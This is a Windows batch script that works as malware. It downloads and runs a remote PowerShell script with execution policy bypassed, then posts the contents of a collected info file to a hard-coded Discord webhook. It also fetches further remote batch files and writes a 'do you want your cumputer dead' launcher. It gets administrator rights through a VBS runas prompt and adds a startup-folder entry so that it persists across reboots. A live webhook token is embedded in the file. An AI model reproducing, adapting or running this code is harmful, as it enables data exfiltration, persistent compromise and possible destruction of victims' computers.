@echo off
setlocal enabledelayedexpansion
:: times value in bitluckstarter.bat is not made so yeah please fix later me
set times="w"
set neededadmin="F"
set webhook=https://discord.com/api/webhooks/1485724958289170434/uggu5b0Dny1L_7NG7UJGywOBve8B35MNnFSLtKNdw6zsJgM33Znu-8l5G34amCR6EF-h
cd /d "%~dp0"
if exist "C:\Users\started.txt" (
    for /F "tokens=* delims=" %%t in ("C:\Users\started.txt") do set times=%%t
    goto virus
) else (
    goto main
) 


:POST
for /f "usebackq delims=" %%A in ("info.txt") do (
    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
)
goto virus

:main
if not exist "%~dp0pissman.ps1" (
    curl -L https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman.ps1 -o pissman.ps1
)
powershell -ExecutionPolicy Bypass -File pissman.ps1
goto loop

:loop
if not exist "done.txt" (
    timeout /T 2 >nul 
    goto loop
) else (
    goto POST
)

:virus
if "%times%" equ "w" (
    if not exist "%~dp0japper.bat" (
        curl -L https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper.bat -o japper.bat
    )
    if not exist "%~dp0japper_killer.bat" (
        curl -L https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper_killer.bat -o japper_killer.bat
    )
    if not exist "%localappdata%wannadie.bat" (
        cd /d "%localappdata%"
        echo @echo off>wannadie.bat
        echo echo do you want your cumputer dead>>wannadie.bat
        echo set /p choice=">> ">>wannadie.bat
        echo if "%%choice%%"=="y" (%~dp0japper.bat)>>wannadie.bat
        echo if "%%choice%%"=="Y" (%~dp0japper.bat)>>wannadie.bat
        echo if "%%choice%%"=="yes" (%~dp0japper.bat)>>wannadie.bat
        echo if "%%choice%%"=="Yes" (%~dp0japper.bat)>>wannadie.bat
        echo if "%%choice%%"=="YES" (%~dp0japper.bat)>>wannadie.bat
        echo if "%%choice%%"=="n" (echo fine)>>wannadie.bat
        echo if "%%choice%%"=="no" (echo fine)>>wannadie.bat
        echo if "%%choice%%"=="N" (echo fine)>>wannadie.bat
        echo if "%%choice%%"=="NO" (echo fine) else (%~dp0japper.bat)>>wannadie.bat
    )
    if "%neededadmin%"=="T" (
        start "" "%localappdata%wannadie.bat"
    ) else (
        net session >nul 2>&1
        if %errorlevel% == 0 (
            start "" "%localappdata%wannadie.bat"
            goto make_starter
        ) else (
            echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
            set params = %*:"=""
            echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

            "%temp%\getadmin.vbs"
            del "%temp%\getadmin.vbs"
            set neededadmin=T
            goto virus
        )
    )
) else (
    echo no matter how meny times you restart your PC i will still be here 
    echo you have been here for: "%times%"
    if "%neededadmin%"=="T" (
        start "" "%localappdata%wannadie.bat"
    ) else (
        net session >nul 2>&1
        if %errorlevel% == 0 (
            start "" "%localappdata%wannadie.bat"
            goto make_starter
        ) else (
            echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
            set params = %*:"=""
            echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

            "%temp%\getadmin.vbs"
            del "%temp%\getadmin.vbs"
            set neededadmin=T
            goto virus
        )
    )
)
goto make_starter

:make_starter
cd /d "C:\Users"
echo t>started.txt
for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath('CommonStartup')"`) do set startupPath=%%i
cd /d "%startupPath%"
echo @echo off>bitluckerstarter.bat
echo cd /d "C:\Users">>bitluckerstarter.bat
echo start "" "%~dp0bb7.bat">>bitluckerstarter.bat
echo exit /b 0>>bitluckerstarter.bat
pause